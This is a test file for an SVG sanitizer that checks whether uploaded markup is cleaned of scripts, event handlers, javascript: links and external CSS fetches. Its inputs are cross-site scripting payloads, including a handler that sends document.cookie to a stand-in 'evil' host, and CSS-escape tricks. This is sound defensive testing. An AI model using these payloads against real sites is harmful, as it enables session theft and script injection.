// A RawItem's markup is the one place uploaded SVG becomes live DOM in the app's
// origin (the editor canvas). `sanitizeChildren` must rebuild it from an
// allowlist: no handler, no script, no foreignObject, no href or CSS that leaves
// the document — and leave ordinary paint alone.

import { test } from 'node:test'
import assert from 'node:assert/strict'
import { sanitizeChildren, type MarkupNode } from '../src/components/vector/sanitizeMarkup.ts'

const SVG = 'http://www.w3.org/2000/svg'
const XHTML = 'http://www.w3.org/1999/xhtml'

function el(tag: string, attrs: Record<string, string> = {}, children: MarkupNode[] = [], ns = SVG): MarkupNode {
  return {
    nodeType: 1,
    localName: tag,
    namespaceURI: ns,
    attributes: Object.entries(attrs).map(([name, value]) => ({
      name,
      localName: name.includes(':') ? name.slice(name.indexOf(':') + 1) : name,
      value,
    })),
    childNodes: children,
  }
}
const text = (v: string): MarkupNode => ({ nodeType: 3, nodeValue: v })
const comment = (v: string): MarkupNode => ({ nodeType: 8, nodeValue: v })
const pi = (v: string): MarkupNode => ({ nodeType: 7, nodeValue: v })
const root = (...children: MarkupNode[]) => el('svg', {}, children)

test('event handlers are stripped from every element', () => {
  const out = sanitizeChildren(
    root(
      el('image', { href: 'x', onerror: "fetch('//evil/?'+document.cookie)", width: '10' }),
      el('g', { ONLOAD: 'alert(1)' }, [el('rect', { width: '4', onclick: 'alert(2)' })]),
    ),
  )
  assert.doesNotMatch(out, /on(error|load|click)/i)
  assert.doesNotMatch(out, /href="x"/)
  assert.match(out, /<image width="10"><\/image>/)
  assert.match(out, /<rect width="4"><\/rect>/)
})

test('script, foreignObject and foreign-namespace elements are dropped with their subtree', () => {
  const out = sanitizeChildren(
    root(
      el('script', {}, [text('alert(1)')]),
      el('foreignObject', {}, [el('img', { src: 'x', onerror: 'alert(1)' }, [], XHTML)]),
      el('img', { src: 'x' }, [], XHTML),
      el('iframe', { src: 'javascript:alert(1)' }),
      el('path', { d: 'M0 0L1 1' }),
    ),
  )
  assert.doesNotMatch(out, /script|foreignObject|img|iframe|alert/i)
  assert.equal(out, '<path d="M0 0L1 1"></path>')
})

test('animations that would write an href or a handler are dropped', () => {
  const out = sanitizeChildren(
    root(
      el('a', {}, [el('set', { attributeName: 'href', to: 'javascript:alert(1)' })]),
      el('animate', { attributeName: 'xlink:href', values: 'javascript:alert(1)' }),
      el('animate', { attributeName: 'onbegin', to: 'x' }),
      el('animate', { attributeName: 'opacity', from: '0', to: '1', onbegin: 'alert(1)' }),
    ),
  )
  assert.doesNotMatch(out, /javascript|onbegin|alert/i)
  assert.match(out, /<animate attributeName="opacity" from="0" to="1"><\/animate>/)
})

test('hrefs keep in-document references and embedded rasters only', () => {
  const png = 'data:image/png;base64,AAAA'
  const out = sanitizeChildren(
    root(
      el('use', { href: '#shape' }),
      el('use', { 'xlink:href': '#other' }),
      el('image', { 'xlink:href': png }),
      el('a', { href: 'javascript:alert(1)' }),
      el('a', { 'xlink:href': ' JavaScript:alert(1)' }),
      el('image', { href: 'data:image/svg+xml,<svg onload="alert(1)"/>' }),
      el('image', { href: 'https://evil.example/pixel.png' }),
    ),
  )
  assert.match(out, /href="#shape"/)
  assert.match(out, /xlink:href="#other"/)
  assert.ok(out.includes(`xlink:href="${png}"`))
  assert.doesNotMatch(out, /javascript|evil|svg\+xml/i)
})

test('CSS cannot fetch, and markup inside a <style> stays text', () => {
  const out = sanitizeChildren(
    root(
      el('style', {}, [
        text(
          '@import url(https://evil/x.css); .a{fill:url(#g)} .b{background:url("https://evil/p")} </style><img src=x onerror=alert(1)>',
        ),
      ]),
      el('rect', { style: 'fill:url(https://evil/p);stroke:red', fill: 'url(#g)' }),
      el('rect', { fill: 'url(https://evil/q)' }),
    ),
  )
  assert.doesNotMatch(out, /evil|@import/)
  assert.match(out, /fill:url\(#g\)/)
  assert.ok(out.includes('&lt;/style&gt;&lt;img'), 'the closing tag is escaped text, not markup')
  assert.match(out, /<rect style="fill:none;stroke:red" fill="url\(#g\)"><\/rect>/)
  assert.match(out, /<rect><\/rect>/)
})

test('comments and processing instructions vanish; text and attribute values are escaped', () => {
  const out = sanitizeChildren(
    root(
      comment('--><img src=x onerror=alert(1)>'),
      pi('x ><img src=x onerror=alert(1)>'),
      el('text', { 'data-x': '"><script>' }, [text('a < b & c')]),
    ),
  )
  assert.equal(out, '<text data-x="&quot;&gt;&lt;script&gt;">a &lt; b &amp; c</text>')
})

test('ordinary paint survives byte for byte (case of camelCase tags kept)', () => {
  const out = sanitizeChildren(
    root(
      el('defs', {}, [
        el('linearGradient', { id: 'g', x1: '0', x2: '1' }, [
          el('stop', { offset: '0', 'stop-color': '#f00' }),
          el('stop', { offset: '1', 'stop-color': '#00f' }),
        ]),
        el('filter', { id: 'f' }, [el('feGaussianBlur', { stdDeviation: '2' })]),
      ]),
    ),
  )
  assert.equal(
    out,
    '<defs><linearGradient id="g" x1="0" x2="1"><stop offset="0" stop-color="#f00"></stop>' +
      '<stop offset="1" stop-color="#00f"></stop></linearGradient>' +
      '<filter id="f"><feGaussianBlur stdDeviation="2"></feGaussianBlur></filter></defs>',
  )
})

test('a <style> is checked as one string, and CSS escapes / image-set are refused', () => {
  const cdata = (v: string): MarkupNode => ({ nodeType: 4, nodeValue: v })
  const out = sanitizeChildren(
    root(
      el('style', {}, [text('.a{fill:u'), cdata('rl(https://evil/split)}')]),
      el('style', {}, [text('.b{background:\\75 rl(https://evil/esc)}')]),
      el('style', {}, [text('.c{background:image-set("https://evil/set" 1x)}')]),
      el('rect', { fill: 'u\\72l(https://evil/attr)' }),
    ),
  )
  assert.doesNotMatch(out, /evil/)
})

test('<title>/<desc> keep their text only (they are HTML integration points)', () => {
  const out = sanitizeChildren(root(el('title', {}, [text('Logo '), el('style', {}, [text('*{}')]), text('mark')])))
  assert.equal(out, '<title>Logo mark</title>')
})
